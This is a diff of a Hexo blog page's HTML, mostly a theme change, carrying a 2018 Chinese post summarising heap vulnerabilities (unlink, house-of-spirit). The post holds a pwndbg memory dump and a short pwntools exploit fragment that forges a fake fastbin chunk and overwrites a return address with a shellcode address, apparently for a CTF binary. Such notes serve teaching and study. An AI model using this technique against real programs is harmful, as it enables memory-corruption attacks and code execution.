@@ -1,133 +1,104 @@
-<!DOCTYPE html>
+<!DOCTYPE HTML>
 <html>
-    <head>
-    <meta http-equiv="content-type" content="text/html; charset=utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
-    <title>
-        
-        堆漏洞总结 · BOBpenのStudio
-        
-    </title>
-    <link rel="icon" href= /assests/favicon.ico>
-    <!-- 提前加载place holder  -->
-    <style>
-        @font-face {
-            font-family: 'Oswald-Regular';
-            src: url('/font/Oswald-Regular.ttf');
-        }
-        @font-face {
-            font-family: 'Source Sans Pro';
-            src: url('/font/Source Sans Pro.woff'),
-            url('/font/Source Sans Pro.woff2');
-            font-weight: normal;
-            font-style: normal;
-        }
-        @font-face {
-            font-family: 'Source Code Pro';
-            src: url('/font/SourceCodePro-Regular.ttf.woff'),
-            url('/font/SourceCodePro-Regular.ttf.woff2');
-            font-weight: normal;
-            font-style: normal;
-        }
-        
-        
-        .site-intro-placeholder {
-        position: absolute;
-        z-index: -2;
-        top: 0;
-        left: 0px;
-        width: calc(100% + 300px);
-        height: 100%;
-        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
-        background-position: center center;
-        transform: translate3d(-226px, 0, 0);
-        animation: gradient-move 2s ease-out 0s 1;
-        }
-        @keyframes gradient-move {
-        0% {
-            transform: translate3d(-226px, 0, 0);
-        }
-        99% {
-            transform: translate3d(0, 0, 0);
-        }
-        99.1% {
-            transform: translate3d(-226px, 0, 0);
-        }
-        100% {
-            transform: translate3d(-226px, 0, 0);
-        }
-    }
-    </style>
-    <link rel="stylesheet" href = /css/style.css?v=20171005 />
-    <script src="//cdn.staticfile.org/jquery/3.2.1/jquery.min.js" defer></script>
-    
-    <script src="/scripts/main.js" defer></script>
-    <!-- 百度统计  -->
-    
-    <!-- 谷歌统计  -->
-    
-</head>
-    
-        <body class="post-body">
-    
-    
-<header class="header">
+<head>
+  <meta charset="utf-8">
+  
+  <title>堆漏洞总结 | BOBpenのStudio</title>
+  <meta name="author" content="BOBpen">
+  
+  <meta name="description" content="Just Do It Anyway">
+  
+  
+  <meta property="og:title" content="堆漏洞总结"/>
+  <meta property="og:site_name" content="BOBpenのStudio"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-    <div class="header-sidebar-menu">&#xe775;</div>
-    <!-- post页的toggle banner  -->
+  
+    <meta property="og:image" content=""/>
+  
+   <link rel="apple-touch-icon" href="/icon.png" />
+   <link rel="shortcut icon" href="/favicon.png" >
+   <link rel="alternate" href="http://xxx.xx/atom.xml" title="BOBpenのStudio" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
+</head>
+
+
+<body>
+  <div id="content" class="inner">
+    <aside id="sidebar" class="alignleft">
+      <div class="navigationBar">
+        <a href="/">BOBpenのStudio</a>
+      </div>
+    	
+  <nav class="widget" id="menu">
+	<ul>
     
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/" >BOBpenのStudio.</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">堆漏洞总结</a>
-            </div>
-    </div>
+      <li class="cell"><a class="next" href="/">Home</a><li>
     
-    <a class="home-link" href=/>BOBpenのStudio.</a>
-</header>
-    <div class="wrapper">
-        <div class="site-intro">
+      <li class="cell"><a class="next" href="/archives/">Archives</a><li>
     
-    <!-- 主页  -->
+      <li class="cell"><a class="next" href="/about/">About</a><li>
     
+      <li class="cell"><a class="next" href="/atom.xml">Subscribe</a><li>
     
-    <!-- 404页  -->
-            
-    <div class="site-intro-img" style="background-image: url(http://oumn0o088.bkt.clouddn.com/post-bg.jpg)"></div>
-    <div class="site-intro-placeholder"></div>
-    <div class="site-intro-meta">
-        <!-- 标题  -->
-        <h1 class="intro-title">
-            <!-- 主页  -->
-            
-            堆漏洞总结
-            <!-- 404 -->
-            
-        </h1>
-        <!-- 副标题 -->
-        <p class="intro-subtitle">
-            <!-- 主页副标题  -->
-            
-            
-        </p>
-        <!-- 404 -->
-        
-        <!-- 文章页meta -->
-        
-            <!-- 文章页标签  -->
-            
-            <div class="post-intro-meta">
-                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                <span class="post-intro-time">2018/01/25</span>
-            </div>
-        
-    </div>
+    </ul>
+</nav>
+
+  <div class="widget weibo">
+<iframe width="100%" height="100" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=110&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=0&isWeibo=0&isFans=0&uid=&verifier=78e1ee4d&colors=ffffff,ffffff,999,000,ecfbfd&dpc=1"></iframe>
 </div>
-        <div class="container">
-            <main class="main post-page">
-    <article class="article-entry">
+
+  
+
+  
+
+    	<footer id="footer" class="inner"><div class="copyright">
+  
+  &copy; 2018 BOBpen
+  
+</div>
+
+
+
+</footer>
+    </aside>
+    
+    
+    <div id="hidden-navigationBar" class="navigationBar">
+      <a href="/">BOBpenのStudio</a>
+    </div>
+    <div id="main-col" class="alignright">
+    <div id="wrapper">
+      
+<article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+  <header>
+      
+      
+  
+    <h1 class="title">堆漏洞总结</h1>
+  
+
+      <time datetime="2018-01-25T12:49:54.000Z"><a href="/2018/01/25/堆 /">2018-01-25</a></time>
+      
+  </header>
+    <div class="entry">
+      
         <h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>这是个堆漏洞简单总结笔记</p>
 <p><a href="http://yunnigu.dropsec.xyz/2017/04/05/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="external">unlink利用</a></p>
 <p><a href="https://etenal.me/archives/1121" target="_blank" rel="external">堆系列漏洞</a></p>
@@ -186,7 +157,7 @@
 <li>溢出的过程中，可以构造size</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0e:0070│      0x7fffd28bde28 ◂— 0x41 /* &apos;A&apos; */</div><div class="line">0f:0078│      0x7fffd28bde30 ◂— 0x0</div><div class="line">10:0080│      0x7fffd28bde38 —▸ 0x7fffd28bde30 ◂— 0x0</div><div class="line">11:0088│      0x7fffd28bde40 —▸ 0x7fffd28bdea0 —▸ 0x7fffd28bdec0 —▸ 0x400b60 ◂— push   r15</div></pre></td></tr></table></figure>
-<p>因为堆是从<strong>低地址</strong>向<strong>高地址</strong>生长的，所以可以看到，构造的size的0x41就是chunk头的第二部分，从而紧接着的地址 <strong>0x7fffd28bde30</strong> 就是返回的伪chunk指针， <strong>0x7fffd28bde38</strong> 是存放dest的地址，可以看到被溢出覆盖为 <strong>0x7fffd28bde38</strong>。这就可以在free之后，把 <strong>0x7fffd28bde30</strong> 申请出来了。</p>
+<p>因为堆是从<strong>低地址</strong>向<strong>高地址</strong>生长的，所以可以看到，构造的size的0x41就是chunk头的第二部分，从而紧接着的地址 <strong>0x7fffd28bde30</strong> 就是返回的伪chunk指针， <strong>0x7fffd28bde38</strong> 是存放dest的地址，可以看到被溢出覆盖为 <strong>0x7fffd28bde30</strong>。这就可以在free之后，把 <strong>0x7fffd28bde30</strong> 申请出来了。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">p.recvuntil(&apos;id ~~?&apos;)</div><div class="line">    p.sendline(&apos;32&apos;)</div><div class="line">    p.recvuntil(&apos;money~&apos;)</div><div class="line">    data = p64(0) * 5 + p64(0x41) # 伪造堆块的size</div><div class="line">    data = data.ljust(0x38, &apos;\x00&apos;) + p64(fake_addr) </div><div class="line">    # 覆盖堆指针 </div><div class="line">    p.send(data)</div><div class="line">    ##raw_input()</div><div class="line">    p.recvuntil(&apos;choice : &apos;)</div><div class="line">    p.sendline(&apos;2&apos;) # 释放伪堆块进入fastbin</div><div class="line">    p.recvuntil(&apos;choice : &apos;)</div><div class="line">    p.sendline(&apos;1&apos;)</div><div class="line">    p.recvuntil(&apos;long?&apos;)</div><div class="line">    p.sendline(&apos;48&apos;)</div><div class="line">    p.recvuntil(&apos;\n48\n&apos;) # 将伪堆块申请出来</div><div class="line">    data = &apos;a&apos; * 0x18 + p64(shellcode_addr) # 将eip修改为shellcode的地址</div><div class="line">~~~ </div><div class="line"></div><div class="line">因为</div><div class="line"></div><div class="line">![](/Users/linwei/blog/source/_posts/Jietu20180129-185317.jpg)</div><div class="line"></div><div class="line">可以看到 **0x7fffd28bde30** 和 ret 之间有 3个0x8的偏移，就是0x18 ，所以exp中，**先填充 0x18的padiing**，再 **覆盖ret为shellcode的地址**</div><div class="line"></div><div class="line"></div><div class="line">## 0x05-总结！！  ##</div><div class="line">* exp中的 **data = p64(0) * 5 + p64(0x41)** 在内存中 p64是占用8个字节，所以在内存中是</div></pre></td></tr></table></figure>
 <p>pwndbg&gt; x/20gx 0x7fffd28bde00<br>0x7fffd28bde00:    0x0000000000000000    0x0000000000000000<br>0x7fffd28bde10:    0x0000000000000000    0x0000000000000000<br>0x7fffd28bde20:    0x0000000000000000    0x0000000000000041<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">即</div></pre></td></tr></table></figure></p>
 <p>pwndbg&gt; x/20gx 0x7fffd28bde00<br>0x7fffd28bde00:            p64（0）              p64（0）<br>0x7fffd28bde10:            p64（0）              p64（0）<br>0x7fffd28bde20:            p64（0）              <em>size</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">* 申请的大小为 48 ，因为 0x41 是包含**chunk头在内的大小**，所以实际大小是 **0x40 - 0x10(16) = 0x30 = 48**</div></pre></td></tr></table></figure></p>
@@ -197,227 +168,43 @@
 <p><a href="http://pwn4.fun/2017/06/26/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BHouse-of-Spirit/" target="_blank" rel="external">参考1</a></p>
 <p><a href="https://www.anquanke.com/post/id/85357#mao" target="_blank" rel="external">参考2</a></p>
 
-    </article>
-    <!-- 前后页  -->
-    <ul class="post-pager">
-        
-        
-            <li class="previous">
-                <a href= "/2018/01/25/堆基础笔记/" title= 堆基础笔记 >
-                    <span>Previous Post</span>
-                    <span>堆基础笔记</span>
-                </a>
-            </li>
-        
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-<!-- City版安装代码已完成 -->
-    
-    
-    <!--PC版-->
-
-    
-</main>
-            <!-- profile -->
-            
-        </div>
-        <footer class="footer">
-    <!-- social  -->
-    
-    <div class="social">
-        
-    
-        
-            
-                <a href="emailto:294199511@qq.com" class="iconfont-archer email" title=email ></a>
-            
-        
-    
-        
-            
-                <a href="//github.com/BOBpen" class="iconfont-archer github" target="_blank" title="github"></a>
-            
-        
-    
-        
-    
-        
-            
-                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
-            
-        
-    
-
+	 
+	     <p style="margin:20px 0; color:#9f9f9f; font-size:12px;">
+<span>Posted by <a style="color:#9f9f9f;" href=""><strong></strong></a> - 2018-01-25</span><br />
+<span style="line-height:13px;">如需转载，请注明： 本文来自 <a style="color:#9f9f9f;" href="http://yoursite.com"><strong>BOBpenのStudio</strong></a></span>
+</p>
+       	 
+      
     </div>
-    
-    <!-- powered by Hexo  -->
-    <div class="copyright">
-        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">archer</a></span>
-    </div>
-    <!-- 不蒜子  -->
-    
-</footer>
-    </div>
-    <!-- toc -->
-    
-    <div class="toc-wrapper">
-        <div class="toc-catalog">
-            CATALOG
-        </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#堆"><span class="toc-number">1.</span> <span class="toc-text">堆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-unlink"><span class="toc-number">2.</span> <span class="toc-text">0x01-unlink</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-例子"><span class="toc-number">3.</span> <span class="toc-text">0x02-例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-house-of-spirit"><span class="toc-number">4.</span> <span class="toc-text">0x03  house-of-spirit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-例子"><span class="toc-number">5.</span> <span class="toc-text">0x04 -例子</span></a></li></ol>
-    </div>
-    
-    <div class="back-top">&#xe639;</div>
-    <div class="sidebar">
-    <div class="sidebar-header">
-        <div class="sidebar-category">
-            <span class="sidebar-archive-link"><span class="iconfont-archer">&#xe67d;</span>Archive</span>
-            <span class="sidebar-tags-link"><span class="iconfont-archer">&#xe610;</span>Tag</span>
-        </div>
-    </div>
-    <div class="sidebar-content sidebar-content-show-archive">
-          <div class="sidebar-archive">
-    <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    <div class="total-archive"> Total : 5 </div>
-    
-    <div class="post-archive">
-    
-    
-    
-    
-    <div class="archive-year"> 2018 </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2018/01/25/堆 /" >堆漏洞总结</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2018/01/25/堆基础笔记/" >堆基础笔记</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> 2017 </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/23</span><a class="archive-post-title" href= "/2017/09/23/how2heap-serious-1/" >'how-heap-serious'</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/22</span><a class="archive-post-title" href= "/2017/09/22/how2heap-serious-2/" >how2heap-unlink</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/21</span><a class="archive-post-title" href= "/2017/09/21/how2heap-unlink/" >how2heap-unlink</a>
-        </li>
-    
-    </div>
+    <footer>
+      
+	 
+     		  
+       		
+     		  
+       	 
+      
+      <div class="clearfix"></div>
+    </footer>
   </div>
-        <div class="sidebar-tags">
-    <div class="sidebar-tags-name">
-    
-    </div>
-    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
-    缺失模块。<br/>
-    1、请确保node版本大于6.2<br/>
-    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
-    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
-    3、在根目录_config.yml里添加配置：
-    <pre style="color: #888; font-size: 0.6rem;">
-jsonContent:
-  meta: false
-  pages: false
-  posts:
-    title: true
-    date: true
-    path: true
-    text: false
-    raw: false
-    content: false
-    slug: false
-    updated: false
-    comments: false
-    link: false
-    permalink: false
-    excerpt: false
-    categories: false
-    tags: true</pre>
-    </div> 
-    <div class="sidebar-tag-list"></div>
+</article>
+
+
 </div>
     </div>
-</div> 
-    <script>
-    var jsInfo = {
-        root: '/'
-    }
-</script>
-    <!-- 不蒜子  -->
+    <div class="tabbar" onload="divideTabBar()">
+	
+      <div class="tabbaritem"><a class="next" href="/">Home</a></div>
     
-    <!-- CNZZ统计  -->
+      <div class="tabbaritem"><a class="next" href="/archives/">Archives</a></div>
     
-    </div>
-    </body>
+      <div class="tabbaritem"><a class="next" href="/about/">About</a></div>
+    
+      <div class="tabbaritem"><a class="next" href="/atom.xml">Subscribe</a></div>
+    
+</div>
+
+
+  </div>
+</body>
 </html>
-
-
